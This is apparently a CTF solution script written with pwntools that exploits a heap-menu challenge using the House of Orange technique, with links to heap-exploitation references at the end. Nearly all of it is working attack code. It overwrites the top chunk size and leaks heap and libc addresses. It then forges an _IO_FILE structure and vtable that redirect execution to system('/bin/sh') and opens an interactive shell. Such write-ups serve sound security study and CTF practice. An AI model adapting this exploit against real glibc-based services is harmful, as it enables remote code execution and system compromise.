from pwn import *

def create(size):
    r.sendlineafter('choice:','1')
    r.sendlineafter('Size:',str(size))

def delete(idx):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Index:',str(idx))

def edit(idx,size,cont):
    r.sendlineafter('choice:','3')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',cont)

def show(idx):
    r.sendlineafter('choice:','4')
    r.sendlineafter('Index:',str(idx))
    Name = r.recvline().strip()[5:]
    Content = r.recvline().strip()[8:]
    return Name,Content


###Useful Address
IO_list_all_offset = 0x3c4520
main_arena_offset = 0x3c3b20
system_offset = 0x45390

###Start Exploit
r = remote('csie.ctf.tw',10146)

###Create block*2
r.sendlineafter('Name:','M30W'*8)
create(0xf8)
edit(0,0x100,b'a'*0xf8+p64(0xf01))
create(0x1000)

edit(0,0x100,b'a'*0x100)
name,content = show(0)
heap_addr = u64(name[0x20:].ljust(8,b'\x00'))-0x10
top_chnk_ptr_addr = u64(content[0x100:].ljust(8,b'\x00'))
print(hex(heap_addr))
print(hex(top_chnk_ptr_addr))

vtable_addr = heap_addr+0x100+0x100
main_arena_addr = top_chnk_ptr_addr-0x58
libc_base = main_arena_addr-main_arena_offset
IO_list_all_addr = IO_list_all_offset+libc_base
system_addr = system_offset+libc_base

padding = b'\x00'*0xf0
stream  = b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(IO_list_all_addr-0x10)
stream += p64(0)+p64(1)
stream  = stream.ljust(0xd8,b'\x00')
stream += p64(vtable_addr)
stream  = stream.ljust(0x100,b'\x00')
vtable  = p64(0)*3+p64(system_addr)
payload = padding+stream+vtable

edit(0,0x300,payload)
create(0x100)

r.interactive()



### Reference
#  house of oranges
##  https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c

#  main_arena structure
##  https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html

#  _IO_FILE_struct
##  https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html

#  _IO_FILE_plus
##  https://code.woboq.org/userspace/glibc/libio/libioP.h.html

#  How heap works
##  https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
